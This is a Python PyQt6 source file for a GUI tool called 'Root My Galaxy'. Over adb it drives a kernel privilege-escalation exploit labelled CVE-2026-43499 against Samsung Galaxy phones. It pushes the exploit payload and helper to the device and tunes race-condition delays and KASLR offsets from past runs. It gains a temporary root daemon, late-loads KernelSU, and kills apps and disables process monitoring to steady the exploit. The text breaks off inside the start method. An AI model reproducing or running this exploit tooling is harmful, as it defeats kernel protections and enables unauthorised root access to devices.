#!/usr/bin/env python3
"""Standalone Qt6 root GUI with embedded runner logic."""

from __future__ import annotations

import os
import argparse
import json
import re
import shutil
import subprocess
import sys
import time
from html import escape
from pathlib import Path

from PyQt6.QtCore import QElapsedTimer, QProcess, QProcessEnvironment, QTimer, Qt
from PyQt6.QtGui import QFont
from PyQt6.QtWidgets import (
    QApplication, QComboBox, QFormLayout, QFrame, QGroupBox, QHBoxLayout,
    QCheckBox, QDialog, QDialogButtonBox, QFileDialog, QLabel, QLineEdit, QMainWindow,
    QMessageBox, QProgressBar, QPushButton, QSpinBox, QStatusBar,
    QTextEdit, QStyleFactory, QVBoxLayout, QWidget, QGridLayout,
)


ANSI_ESCAPE = re.compile(r"(?:\x1B|␛)\[[0-?]*[ -/]*[@-~]")

PIPELINE_STAGES = (
    ("preparing-kernel-access", "06 Preparation"),
    ("locating-kernel", "07 Kernel location"),
    ("kernel-location-ready", "07 KASLR resolved"),
    ("probabilistic-lifetime-race", "08 Lifetime race"),
    ("verifying-kernel-access", "09 Access verification"),
    ("kernel-page-ready", "09 Kernel page ready"),
    ("entering-main-route", "10 Target transition"),
    ("starting-temporary-root", "11 UMH bootstrap"),
    ("temporary-root-ready", "12 Temporary root daemon"),
    ("loading-kernelsu", "15 KernelSU late-load"),
    ("full-root-ready", "17 Full-root validation"),
)


class RootWindow(QMainWindow):
    def __init__(self) -> None:
        super().__init__()
        self.process: QProcess | None = None
        self.cleanup_process: QProcess | None = None
        self.restore_process: QProcess | None = None
        self.device_clock_process: QProcess | None = None
        self.device_uptime_seconds: int | None = None
        self.log_process: QProcess | None = None
        self.selected_serial = ""
        self.adaptive_state_path = Path(__file__).with_name(
            ".root-my-galaxy-state.json")
        self.adaptive_state = self._load_adaptive_state()
        self.adaptive_build = ""
        self.adaptive_boot_id = ""
        self.adaptive_delays = [25000, 20000, 30000, 50000, 15000]
        self.adaptive_slide = ""
        self.adaptive_log_lines: list[str] = []
        self.adaptive_live_status = "Waiting for a test run"
        self.adaptive_stage_index = -1
        self.quiet_deadline: float | None = None
        self.quiet_duration = 0
        self.log_started = False
        self.root_active = False
        assets = Path(__file__).with_name("assets")
        jni_libs = assets
        self.helper_path = str(jni_libs / "libcve43499root.so")
        self.payload_path = str(assets / "cve-2026-43499-app-lab-afzg1.so")
        self.ksud_path = str(assets / "ksud-next")
        self.device_name = "No device"
        self.elapsed = QElapsedTimer()
        self.run_timer = QTimer(self)
        self.run_timer.timeout.connect(self.update_elapsed_status)
        self.uptime_timer = QTimer(self)
        self.uptime_timer.setInterval(1000)
        self.uptime_timer.timeout.connect(self.update_device_uptime)
        self.setWindowTitle("Root My Galaxy")
        self.resize(900, 600)
        self.setMinimumSize(820, 540)
        self._build_ui()
        self.refresh_devices()
        self.uptime_timer.start()

    @staticmethod
    def _sh_quote(value: str) -> str:
        return "'" + value.replace("'", "'\"'\"'") + "'"

    def _load_adaptive_state(self) -> dict:
        try:
            data = json.loads(self.adaptive_state_path.read_text())
            return data if isinstance(data, dict) else {"version": 1, "profiles": {}}
        except (OSError, ValueError):
            return {"version": 1, "profiles": {}}

    def _save_adaptive_state(self) -> None:
        temporary = self.adaptive_state_path.with_suffix(".json.tmp")
        try:
            temporary.write_text(json.dumps(self.adaptive_state, indent=2, sort_keys=True) + "\n")
            temporary.replace(self.adaptive_state_path)
        except OSError:
            temporary.unlink(missing_ok=True)

    def _prepare_adaptive_profile(self, serial: str) -> None:
        self.adaptive_log_lines = []
        try:
            result = subprocess.run(
                ["adb", "-s", serial, "shell", "sh", "-c",
                 "getprop ro.build.display.id; cat /proc/sys/kernel/random/boot_id"],
                text=True, capture_output=True, timeout=5, check=False,
            )
            values = [line.strip() for line in result.stdout.splitlines() if line.strip()]
        except (OSError, subprocess.TimeoutExpired):
            values = []
        self.adaptive_build = values[0] if values else "unknown"
        self.adaptive_boot_id = values[1] if len(values) > 1 else ""

        profiles = self.adaptive_state.setdefault("profiles", {})
        profile = profiles.setdefault(self.adaptive_build, {"delays": {}, "boots": {}})
        defaults = [25000, 20000, 30000, 50000, 15000]
        delay_stats = profile.setdefault("delays", {})
        self.adaptive_delays = sorted(
            defaults,
            key=lambda delay: (
                -int(delay_stats.get(str(delay), {}).get("root_success", 0)),
                -int(delay_stats.get(str(delay), {}).get("scheduler_success", 0)),
                defaults.index(delay),
            ),
        )
        boot = profile.setdefault("boots", {}).get(self.adaptive_boot_id, {})
        slide = str(boot.get("slide", ""))
        self.adaptive_slide = slide if re.fullmatch(r"0x[0-9a-fA-F]+", slide) else ""
        self.adaptive_live_status = "profile loaded; waiting for a test run"
        self.adaptive_stage_index = -1
        self.update_adaptive_dashboard()

    def _learn_from_run(self) -> None:
        if not self.adaptive_build:
            return
        profile = self.adaptive_state.setdefault("profiles", {}).setdefault(
            self.adaptive_build, {"delays": {}, "boots": {}})
        delay_stats = profile.setdefault("delays", {})
        boot = profile.setdefault("boots", {}).setdefault(self.adaptive_boot_id, {})
        current_delay: int | None = None
        current_attempt = "unknown"
        successful_delay: int | None = None
        addresses: dict[str, str] = {}
        seen_events: set[tuple[str, str]] = set()

        for line in self.adaptive_log_lines:
            attempt = re.search(
                r"exploit attempt=(\d+)/\d+ pid=(\d+) delay=(\d+)", line)
            if attempt:
                current_attempt = f"{attempt.group(1)}:{attempt.group(2)}"
                current_delay = int(attempt.group(3))
            slide = re.search(r"slide-kaslr-ok .*p0_offset=([0-9a-fA-F]+)", line)
            if slide:
                boot["slide"] = f"0x{slide.group(1).lower()}"
            page = re.search(
                r"stage=entering-main-route base=([0-9a-fA-F]+) "
                r"lock=([0-9a-fA-F]+) fops=([0-9a-fA-F]+)", line)
            if page:
                addresses = dict(zip(("page", "lock", "fops"), page.groups()))
            outcome = re.search(
                r"sigreturn full mode done calls=(\d+) success=(\d+)", line)
            event_key = (current_attempt, line)
            if outcome and current_delay is not None and event_key not in seen_events:
                seen_events.add(event_key)
                stats = delay_stats.setdefault(str(current_delay), {
                    "runs": 0, "scheduler_success": 0, "root_success": 0})
                stats["runs"] = int(stats.get("runs", 0)) + 1
                if int(outcome.group(2)) > 0:
                    stats["scheduler_success"] = int(stats.get("scheduler_success", 0)) + 1
                    successful_delay = current_delay
            if "stage=temporary-root-ready" in line and successful_delay is not None:
                stats = delay_stats.setdefault(str(successful_delay), {})
                stats["root_success"] = int(stats.get("root_success", 0)) + 1

        boot["last_addresses"] = addresses
        boot["last_delays"] = self.adaptive_delays
        boot["updated_at"] = int(time.time())
        # KASLR state from older boots is retained for history, never reused.
        boots = profile.setdefault("boots", {})
        if len(boots) > 8:
            oldest = sorted(boots, key=lambda key: boots[key].get("updated_at", 0))[:-8]
            for key in oldest:
                del boots[key]
        self._save_adaptive_state()

    @staticmethod
    def _success_rate(successes: int, runs: int) -> str:
        return f"{(100.0 * successes / runs):.1f}%" if runs else "No data"

    def _adaptive_profile(self) -> dict:
        profiles = self.adaptive_state.get("profiles", {})
        if self.adaptive_build and self.adaptive_build in profiles:
            return profiles[self.adaptive_build]
        if profiles:
            return profiles[next(reversed(profiles))]
        return {"delays": {}, "boots": {}, "strategies": {}}

    def update_adaptive_dashboard(self) -> None:
        if not hasattr(self, "adaptive_recommendation"):
            return
        profile = self._adaptive_profile()
        delays = profile.get("delays", {})
        strategies = profile.get("strategies", {})

        total_runs = sum(int(item.get("runs", 0)) for item in delays.values())
        scheduler_hits = sum(
            int(item.get("scheduler_success", 0)) for item in delays.values())
        root_hits = sum(int(item.get("root_success", 0)) for item in delays.values())
        self.adaptive_rates.setText(
            f"Scheduler: {scheduler_hits}/{total_runs} "
            f"({self._success_rate(scheduler_hits, total_runs)})  |  "
            f"Root: {root_hits}/{total_runs} "
            f"({self._success_rate(root_hits, total_runs)})"
        )

        ranked_delays = sorted(
            ((int(delay), stats) for delay, stats in delays.items()),
            key=lambda item: (
                -int(item[1].get("root_success", 0)),
                -int(item[1].get("scheduler_success", 0)),
                -self._safe_ratio(item[1].get("scheduler_success", 0),
                                  item[1].get("runs", 0)),
                int(item[1].get("runs", 0)),
            ),
        )
        if ranked_delays:
            delay, stats = ranked_delays[0]
            runs = int(stats.get("runs", 0))
            hits = int(stats.get("scheduler_success", 0))
            recommendation = (
                f"Continue: {delay} us delay - {hits}/{runs} scheduler hits "
                f"({self._success_rate(hits, runs)})"
            )
        else:
            recommendation = f"Continue: {self.adaptive_delays[0]} us baseline (untested)"

        ranked_strategies = sorted(
            strategies.items(),
            key=lambda item: (
                -int(item[1].get("root_success", 0)),
                -int(item[1].get("scheduler_success", 0)),
                int(item[1].get("crashes", 0)),
                int(item[1].get("runs", 0)),
            ),
        )
        stable = next((item for item in ranked_strategies
                       if not int(item[1].get("crashes", 0))), None)
        if stable:
            key, stats = stable
            recommendation += (
                f"  |  Strategy {key} - "
                f"{int(stats.get('root_success', 0))}/{int(stats.get('runs', 0))} root hits"
            )
        self.adaptive_recommendation.setText(recommendation)

        quarantined = [
            f"{key} ({int(stats.get('crashes', 0))} disconnects)"
            for key, stats in ranked_strategies
            if int(stats.get("crashes", 0)) > 0
        ]
        self.adaptive_quarantine.setText(
            "Discard/quarantine: " + (", ".join(quarantined) if quarantined else "none")
        )
        history = []
        for delay, stats in ranked_delays:
            runs = int(stats.get("runs", 0))
            scheduler = int(stats.get("scheduler_success", 0))
            roots = int(stats.get("root_success", 0))
            history.append(
                f"{delay} us: scheduler {scheduler}/{runs}, root {roots}/{runs}"
            )
        self.adaptive_history.setText(
            "Tested candidates: " + (" | ".join(history) if history else "none yet")
        )
        self.adaptive_live.setText(f"Current run: {self.adaptive_live_status}")
        completed = max(0, self.adaptive_stage_index + 1)
        phase = (PIPELINE_STAGES[self.adaptive_stage_index][1]
                 if self.adaptive_stage_index >= 0 else "not started")
        self.adaptive_pipeline.setText(
            f"Pipeline position: {completed}/{len(PIPELINE_STAGES)} - {phase}"
        )
        self.adaptive_stage_progress.setValue(completed)

    @staticmethod
    def _safe_ratio(numerator: object, denominator: object) -> float:
        total = int(denominator or 0)
        return int(numerator or 0) / total if total else 0.0

    def update_adaptive_live_status(self, text: str) -> None:
        stage = re.search(r"stage=([a-z0-9-]+)", text, re.IGNORECASE)
        attempt = re.search(r"exploit attempt=(\d+)/(\d+).*delay=(\d+)", text)
        outcome = re.search(r"sigreturn full mode done calls=(\d+) success=(\d+)", text)
        if attempt:
            self.adaptive_live_status = (
                f"attempt {attempt.group(1)}/{attempt.group(2)}, "
                f"delay {attempt.group(3)} us"
            )
        normalized = text.lower()
        stage_aliases = {
            "loading kernelsu": "loading-kernelsu",
            "kernelsu control verified": "full-root-ready",
            "full root is active": "full-root-ready",
        }
        detected_stage = stage.group(1).lower() if stage else None
        for marker, alias in stage_aliases.items():
            if marker in normalized:
                detected_stage = alias
        if detected_stage:
            stage_keys = [key for key, _label in PIPELINE_STAGES]
            if detected_stage in stage_keys:
                self.adaptive_stage_index = max(
                    self.adaptive_stage_index, stage_keys.index(detected_stage))
            if detected_stage == "loading-kernelsu":
                self.adaptive_live_status = "temporary root ready; loading KernelSU"
            elif detected_stage == "full-root-ready":
                self.adaptive_live_status = "full root independently validated"
        if stage:
            self.adaptive_live_status = stage.group(1).replace("-", " ")
        if outcome:
            self.adaptive_live_status = (
                "scheduler primitive succeeded" if int(outcome.group(2)) else
                "scheduler primitive failed"
            )
        if "device" in text.lower() and "not found" in text.lower():
            self.adaptive_live_status = "device disconnected - strategy should be quarantined"
        elif "temporary-root-ready" in text:
            self.adaptive_live_status = "temporary root acquired"
        elif "failed" in text.lower() or "operation failed" in text.lower():
            self.adaptive_live_status = "attempt failed; trying the next candidate"
        self.update_adaptive_dashboard()

    def build_root_script(self, serial: str) -> str:
        remote = "/data/local/tmp"
        helper = self._sh_quote(self.helper_path)
        payload = self._sh_quote(self.payload_path)
        ksud = self._sh_quote(self.ksud_path)
        serial_q = self._sh_quote(serial)
        delay_sequence = ",".join(str(value) for value in self.adaptive_delays)
        adaptive_slide = self.adaptive_slide
        return f"""
set -euo pipefail
SERIAL={serial_q}
REMOTE={remote}
HELPER={helper}
PAYLOAD={payload}
KSUD={ksud}
ADB="adb -s $SERIAL"
DELAY_SEQUENCE={delay_sequence}
ADAPTIVE_SLIDE={adaptive_slide}

echo "[*] $($ADB shell getprop ro.build.display.id)"
echo "[*] Preparing exploit files"
$ADB push "$HELPER" "$REMOTE/ksu-helper" >/dev/null
$ADB push "$PAYLOAD" "$REMOTE/ksu-payload" >/dev/null
$ADB push "$KSUD" "$REMOTE/ksud-selected" >/dev/null
$ADB shell "chmod 0755 $REMOTE/ksu-helper $REMOTE/ksu-payload $REMOTE/ksud-selected"

if $ADB shell "$REMOTE/ksu-helper -c id" 2>/dev/null | grep -q "uid=0"; then
    echo "[*] Temporary root is already available; checking..."
    if $ADB shell "$REMOTE/ksu-helper -c id" 2>/dev/null | grep -q "uid=0"; then
        echo "[+] Root is already active through the helper. Nothing to do."
        exit 0
    fi
fi

echo "[*] Running exploit (up to ${{MAX_ATTEMPTS:-5}} attempts; probabilistic)"
ROOTED=0
$ADB shell "mkdir -p $REMOTE && : > $REMOTE/exploit.log"
$ADB shell "EXPLOIT_ATTEMPTS=${{MAX_ATTEMPTS:-5}} EXPLOIT_DELAY_SEQUENCE_USEC=$DELAY_SEQUENCE ${{ADAPTIVE_SLIDE:+SLIDE_P0_OFFSET=$ADAPTIVE_SLIDE}} $REMOTE/ksu-helper --run-payload $REMOTE/ksu-payload $REMOTE/ksu-helper $REMOTE/exploit.log" || true
if $ADB shell "grep -q 'stage=temporary-root-ready' $REMOTE/exploit.log" 2>/dev/null; then
    ROOTED=1
    echo "  [+] Temporary root ready"
fi

if [ "$ROOTED" -ne 1 ]; then
    echo "[!] Exploit failed after ${{MAX_ATTEMPTS:-5}} attempts. Log:" >&2
    $ADB shell "cat $REMOTE/exploit.log" 2>&1 >&2 || true
    exit 1
fi

if [[ "$PAYLOAD" == *cve-2026-43499-app-open.so ]]; then
    echo "[+] Offline payload POC completed; KernelSU late-load skipped"
    exit 0
fi

echo "[*] Loading KernelSU through ksud-next late-load"
$ADB shell "S25U_KSUD_PATH=$REMOTE/ksud-selected $REMOTE/ksu-helper --late-load"

sleep 1
ROOT_ID=$($ADB shell "$REMOTE/ksu-helper -c id" 2>/dev/null || true)
if echo "$ROOT_ID" | grep -q "uid=0"; then
    echo "[+] Full root is active. Helper response:"
    echo "$ROOT_ID"
else
    echo "[+] Full root is active; ksud-next late-load completed and driver control is confirmed."
fi
""".strip()

    def _build_ui(self) -> None:
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        # Dolphin-like header: compact toolbar with clear context.
        header = QFrame()
        header.setObjectName("header")
        header_layout = QHBoxLayout(header)
        header_layout.setContentsMargins(22, 14, 22, 14)
        self.title_label = QLabel("Root My Galaxy")
        self.title_label.setObjectName("title")
        self.subtitle_label = QLabel(self.device_name)
        self.subtitle_label.setObjectName("subtitle")
        self.active_time_label = QLabel("Device uptime · 00:00:00")
        self.active_time_label.setObjectName("activeTime")
        self.subtitle_label.hide()
        self.active_time_label.hide()
        header_layout.addWidget(self.title_label)
        header_layout.addWidget(self.subtitle_label)
        header_layout.addStretch()
        header_layout.addWidget(self.active_time_label)
        layout.addWidget(header)

        content_layout = QVBoxLayout()
        content_layout.setContentsMargins(24, 16, 24, 20)
        content_layout.setSpacing(12)
        layout.addLayout(content_layout, 1)

        self.root_check = QLabel("Root My Galaxy")
        self.root_check.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.root_check.setStyleSheet(
            "font-size: 18px; font-weight: 700; color: #16a34a; padding: 2px;"
        )
        self.root_check.hide()
        content_layout.addWidget(self.root_check)

        self.quiet_progress = QProgressBar()
        self.quiet_progress.setTextVisible(True)
        self.quiet_progress.setFormat("Quiet window · %v/%m s")
        self.quiet_progress.setRange(0, 1)
        self.quiet_progress.hide()

        options = QGroupBox("Execution options")
        form = QFormLayout(options)
        device_row = QHBoxLayout()
        self.devices = QComboBox()
        self.devices.setMinimumWidth(420)
        self.devices.currentIndexChanged.connect(self.check_selected_root)
        self.refresh_button = QPushButton("Refresh")
        self.refresh_button.clicked.connect(self.refresh_devices)
        self.reboot_button = QPushButton("Reboot")
        self.reboot_button.clicked.connect(self.reboot_device)
        self.settings_button = QPushButton("Settings")
        self.settings_button.clicked.connect(self.show_settings)
        device_box = QVBoxLayout()
        device_box.addWidget(self.devices)
        device_buttons = QHBoxLayout()
        device_buttons.addWidget(self.refresh_button)
        device_buttons.addWidget(self.settings_button)
        device_buttons.addStretch(1)
        device_box.addLayout(device_buttons)
        form.addRow("ADB device:", device_box)

        self.kill_user_apps = QCheckBox("Kill all user applications")
        self.kill_user_apps.setToolTip(
            "Force-stops running applications belonging to the current user before the exploit. "
            "This can improve stability by reducing background activity."
        )
        self.kill_user_apps.setChecked(True)

        self.kill_system_apps = QCheckBox("Kill all system applications")
        self.kill_system_apps.setToolTip(
            "Force-stops all detected running packages, including system applications. "
            "Use this only after repeated unsuccessful attempts; Android may temporarily become unstable."
        )
        self.kill_user_apps.hide()
        self.kill_system_apps.hide()
        content_layout.addWidget(options)

        intelligence = QGroupBox("Adaptive intelligence")
        intelligence_layout = QVBoxLayout(intelligence)
        intelligence_layout.setSpacing(5)
        self.adaptive_recommendation = QLabel()
        self.adaptive_recommendation.setObjectName("adaptiveRecommendation")
        self.adaptive_rates = QLabel()
        self.adaptive_rates.setObjectName("adaptiveRates")
        self.adaptive_live = QLabel()
        self.adaptive_live.setObjectName("adaptiveLive")
        self.adaptive_pipeline = QLabel()
        self.adaptive_pipeline.setObjectName("adaptivePipeline")
        self.adaptive_stage_progress = QProgressBar()
        self.adaptive_stage_progress.setRange(0, len(PIPELINE_STAGES))
        self.adaptive_stage_progress.setTextVisible(False)
        self.adaptive_stage_progress.setMaximumHeight(7)
        self.adaptive_history = QLabel()
        self.adaptive_history.setObjectName("adaptiveHistory")
        self.adaptive_quarantine = QLabel()
        self.adaptive_quarantine.setObjectName("adaptiveQuarantine")
        for label in (
                self.adaptive_recommendation, self.adaptive_rates,
                self.adaptive_live, self.adaptive_pipeline,
                self.adaptive_history,
                self.adaptive_quarantine):
            label.setWordWrap(True)
            intelligence_layout.addWidget(label)
            if label is self.adaptive_pipeline:
                intelligence_layout.addWidget(self.adaptive_stage_progress)
        content_layout.addWidget(intelligence)
        self.update_adaptive_dashboard()

        self.output = QTextEdit()
        self.output.setObjectName("terminalOutput")
        self.output.setReadOnly(True)
        self.output.setLineWrapMode(QTextEdit.LineWrapMode.NoWrap)
        self.output.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        self.output.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        log_font = QFont("JetBrainsMono Nerd Font Mono")
        log_font.setStyleHint(QFont.StyleHint.Monospace)
        log_font.setPointSizeF(11.0)
        log_font.setWeight(QFont.Weight.Normal)
        log_font.setStyle(QFont.Style.StyleNormal)
        log_font.setStyleStrategy(
            QFont.StyleStrategy.PreferMatch | QFont.StyleStrategy.PreferQuality
        )
        log_font.setFixedPitch(True)
        self.output.setFont(log_font)
        self.output.setStyleSheet(
            "QTextEdit#terminalOutput {"
            "background: rgba(13, 15, 24, 230); color: #fffaf3; "
            "border: 1px solid rgba(255, 250, 243, 45); border-radius: 10px; "
            "padding: 10px; "
            "font-family: 'JetBrainsMono Nerd Font Mono'; "
            "font-size: 11pt; font-weight: 400; font-style: normal; }"
        )
        self.output.document().setDefaultFont(log_font)
        self.output.hide()
        content_layout.addWidget(self.output, 1)

        controls = QHBoxLayout()
        controls.setContentsMargins(0, 4, 0, 0)
        self.start_button = QPushButton("Root My Galaxy")
        self.start_button.setDefault(True)
        self.start_button.clicked.connect(self.start)
        self.stop_button = QPushButton("Stop")
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop)
        controls.addStretch(1)
        controls.addWidget(self.reboot_button)
        controls.addWidget(self.stop_button)
        controls.addWidget(self.start_button)
        content_layout.addLayout(controls)

        self.status = QLabel("Ready")
        self.status.hide()
        self.status_bar = QStatusBar()
        self.status_bar.addWidget(self.quiet_progress, 1)
        self.setStatusBar(self.status_bar)
        self.setStyleSheet("""
            QMainWindow, QWidget { font-size: 13px; }
            #header { border-bottom: 1px solid palette(mid); }
            #title { font-size: 24px; font-weight: 600; }
            #subtitle { color: #4b5563; margin-left: 8px; }
            #activeTime { color: palette(mid); font-family: monospace; }
            #adaptiveRecommendation { color: #15803d; font-weight: 700; }
            #adaptiveRates { color: palette(text); font-weight: 600; }
            #adaptiveLive { color: #2563eb; }
            #adaptivePipeline { color: palette(text); font-weight: 600; }
            #adaptiveHistory { color: palette(mid); }
            #adaptiveQuarantine { color: #b91c1c; }
            QGroupBox {
                font-weight: 600;
                border: 1px solid palette(mid);
                border-radius: 8px;
                margin-top: 10px;
                padding: 14px 12px 10px;
            }
            QGroupBox::title { subcontrol-origin: margin; left: 12px; padding: 0 5px; }
            QPushButton { padding: 7px 14px; }
            QComboBox, QLineEdit, QSpinBox {
                padding: 6px 10px;
            }
            QCheckBox { spacing: 8px; }
        """)

    def refresh_devices(self) -> None:
        if hasattr(self, "reboot_button"):
            self.reboot_button.setEnabled(True)
        if not shutil.which("adb"):
            self.devices.clear()
            self.devices.addItem("adb not found")
            self.start_button.setEnabled(False)
            self.status.setText("Install Android platform-tools first")
            return
        try:
            result = subprocess.run(["adb", "devices"], text=True, capture_output=True,
                                    timeout=5, check=False)
        except (OSError, subprocess.TimeoutExpired) as exc:
            self.devices.clear()
            self.devices.addItem(f"Could not query adb: {exc}")
            return
        entries = []
        for line in result.stdout.splitlines()[1:]:
            fields = line.split()
            if len(fields) >= 2:
                entries.append((fields[0], fields[1]))
        self.devices.clear()
        for serial, state in entries:
            label = self.device_label(serial, state)
            self.devices.addItem(label, serial)
        if not entries:
            self.devices.addItem("No device detected")
        self.start_button.setEnabled(any(state == "device" for _, state in entries))
        self.status.setText(f"{len(entries)} device(s) found")
        self.selected_serial = str(self.devices.currentData() or "")
        self.update_selected_device_name()
        self.check_selected_root()

    def check_selected_root(self) -> None:
        """Disable exploit execution when the selected device is already rooted."""
        serial = self.devices.currentData()
        if not serial or self.process is not None:
            return
        self.selected_serial = str(serial)
        try:
            result = subprocess.run(
                ["adb", "-s", str(serial), "shell", "su", "-c", "id"],
                text=True, capture_output=True, timeout=3, check=False,
            )
        except (OSError, subprocess.TimeoutExpired):
            return
        if result.returncode == 0 and "uid=0" in result.stdout:
            self.root_active = True
            self.title_label.setText("Root My Galaxy")
            self.root_check.show()
            self.start_button.setEnabled(False)
            self.stop_button.setEnabled(False)
            return
        self.root_active = False
        self.title_label.setText("Root My Galaxy")
        self.root_check.hide()
        self.start_button.setEnabled(self.devices.currentData() is not None)

    def show_settings(self) -> None:
        dialog = QDialog(self)
        dialog.setWindowTitle("Settings")
        dialog.resize(720, 470)
        dialog.setMinimumSize(680, 420)
        dialog_layout = QVBoxLayout(dialog)
        description = QLabel(
            "Choose which running Android applications should be stopped before the exploit."
        )
        description.setWordWrap(True)
        dialog_layout.addWidget(description)

        helper_edit = QLineEdit(self.helper_path)
        payload_edit = QLineEdit(self.payload_path)
        ksud_edit = QLineEdit(self.ksud_path)
        binaries = (
            ("Payload", payload_edit,
             "Exploit payload executed by the helper to obtain the temporary root capability."),
            ("Helper", helper_edit,
             "Native launcher that coordinates the exploit and starts the payload on the device."),
            ("ksud", ksud_edit,
             "KernelSU daemon binary loaded after temporary root is available."),
        )
        grid = QGridLayout()
        grid.setHorizontalSpacing(12)
        grid.setVerticalSpacing(4)
        grid.setColumnMinimumWidth(0, 80)
        grid.setColumnStretch(1, 1)
        for row_index, (label, edit, explanation) in enumerate(binaries):
            edit.setMinimumWidth(420)
            name = QLabel(f"{label}:")
            name.setAlignment(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)
            name.setStyleSheet("font-weight: 600;")
            grid.addWidget(name, row_index * 2, 0)
            grid.addWidget(edit, row_index * 2, 1)
            browse = QPushButton("Browse…")
            browse.setFixedWidth(90)
            browse.clicked.connect(lambda _checked=False, target=edit: self.choose_binary(target))
            grid.addWidget(browse, row_index * 2, 2)
            hint = QLabel(explanation)
            hint.setWordWrap(True)
            hint.setStyleSheet("color: palette(mid); padding-bottom: 6px;")
            grid.addWidget(hint, row_index * 2 + 1, 1, 1, 2)
        dialog_layout.addLayout(grid)

        self.kill_user_apps.show()
        self.kill_system_apps.show()
        dialog_layout.addWidget(self.kill_user_apps)
        dialog_layout.addWidget(self.kill_system_apps)
        buttons = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel
        )
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        dialog_layout.addWidget(buttons)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            self.helper_path = helper_edit.text().strip() or self.helper_path
            self.payload_path = payload_edit.text().strip() or self.payload_path
            ksud_value = ksud_edit.text().strip() or self.ksud_path
            if Path(ksud_value).name != "ksud-next":
                ksud_value = str(Path(ksud_value).with_name("ksud-next"))
            self.ksud_path = ksud_value
        # Keep the controls available for the next Settings dialog.
        self.kill_user_apps.setParent(self)
        self.kill_system_apps.setParent(self)
        self.kill_user_apps.hide()
        self.kill_system_apps.hide()

    def choose_binary(self, target: QLineEdit) -> None:
        path, _ = QFileDialog.getOpenFileName(
            self, "Select binary", str(Path(target.text()).parent), "All files (*)"
        )
        if path:
            target.setText(path)

    def reboot_device(self) -> None:
        serial = self.devices.currentData()
        if not serial:
            QMessageBox.warning(self, "No device", "Select an online adb device first.")
            return
        answer = QMessageBox.question(
            self,
            "Reboot device",
            "Reboot the selected Android device now?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No,
        )
        if answer != QMessageBox.StandardButton.Yes:
            return
        self.reboot_button.setEnabled(False)
        self.start_button.setEnabled(False)
        self.status.setText("Rebooting…")
        self.reboot_process = QProcess(self)
        self.reboot_process.finished.connect(self.reboot_finished)
        self.reboot_process.errorOccurred.connect(self.reboot_error)
        self.reboot_process.start("adb", ["-s", str(serial), "reboot"])

    def reboot_finished(self, exit_code: int, _status: QProcess.ExitStatus) -> None:
        if hasattr(self, "reboot_process"):
            self.reboot_process.deleteLater()
            self.reboot_process = None
        self.status.setText("Device rebooting…" if exit_code == 0 else "Reboot failed")
        QTimer.singleShot(5000, self.refresh_devices)

    def reboot_error(self, _error: QProcess.ProcessError) -> None:
        self.status.setText("Reboot failed")
        self.reboot_button.setEnabled(True)
        if hasattr(self, "reboot_process") and self.reboot_process:
            self.reboot_process.deleteLater()
            self.reboot_process = None

    @staticmethod
    def device_label(serial: str, state: str) -> str:
        """Return a human-readable device name while keeping serial as item data."""
        if state != "device":
            return f"Device unavailable ({state})"
        try:
            props = subprocess.run(
                ["adb", "-s", serial, "shell", "getprop"],
                text=True, capture_output=True, timeout=5, check=False,
            ).stdout.splitlines()
            values = {}
            for line in props:
                if line.startswith("[ro.product.manufacturer]:"):
                    values["manufacturer"] = line.split(":", 1)[1].strip(" []")
                elif line.startswith("[ro.product.model]:") or line.startswith("[ro.product.system.model]:"):
                    values["model"] = line.split(":", 1)[1].strip(" []")
                elif line.startswith("[ro.product.device]:") or line.startswith("[ro.product.system.device]:"):
                    values["device"] = line.split(":", 1)[1].strip(" []")
            manufacturer = values.get("manufacturer", "")
            model = values.get("model", "")
            device = values.get("device", "")
            if not model or model.lower() in {"unknown", "generic", "android"}:
                model = device
            name = " ".join(part for part in (manufacturer, model) if part)
            return name or "Android device"
        except (OSError, subprocess.TimeoutExpired):
            return "Android device"

    def update_selected_device_name(self) -> None:
        label = str(self.devices.currentText()).strip()
        if label and label not in {"No device detected", "adb not found"}:
            self.device_name = label
            self.subtitle_label.setText(self.device_name)
            self.subtitle_label.show()
            self.active_time_label.show()
        else:
            self.device_name = "No device"
            self.subtitle_label.hide()
            self.active_time_label.hide()
            self.active_time_label.setText("Device uptime · 00:00:00")

    def start(self) -> None:
        serial = self.devices.currentData()
        if not serial or self.devices.currentText().endswith("not detected"):
            QMessageBox.warning(self, "No device", "Select an online adb device first.")
            return
        # A previous final poll may still be finishing after Stop. Never let
        # that process block polling for the new run.
        self.stop_remote_log_stream()

        self.output.clear()
        self.output.show()
        self.root_check.hide()
        self.quiet_progress.hide()
        self.root_active = False
        self.title_label.setText("Root My Galaxy")
        self.selected_serial = str(serial)
        self._prepare_adaptive_profile(self.selected_serial)
        self.log_started = False
        self.append_output("Preparing a clean remote run…")
        self.append_output("[GUI] Keeping the device screen awake during the exploit…")
        self.append_output("[GUI] Disabling Android child-process restrictions…")
        if self.kill_system_apps.isChecked():
            self.append_output("[GUI] Stopping all user and system applications for a clean run…")
        elif self.kill_user_apps.isChecked():
            self.append_output("[GUI] Stopping all user applications to improve exploit stability…")
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(False)
        self.refresh_button.setEnabled(False)
        self.cleanup_process = QProcess(self)
        self.cleanup_process.finished.connect(self.start_script)
        self.cleanup_process.errorOccurred.connect(self.cleanup_error)
        if self.kill_system_apps.isChecked():
            package_filter = "sed -nE 's/.* ([A-Za-z0-9._]+)\\/u[0-9]+[^ ]*.*/\\1/p'"
        elif self.kill_user_apps.isChecked():
            package_filter = "sed -nE 's/.* ([A-Za-z0-9._]+)\\/u[0-9]+a[0-9]+.*/\\1/p'"
        else:
            package_filter = "true"
        cleanup_script = ""
        cleanup_script += (
            "input keyevent KEYCODE_WAKEUP; "
            "svc power stayon true; "
            "settings put global settings_enable_monitor_phantom_procs false; "
        )
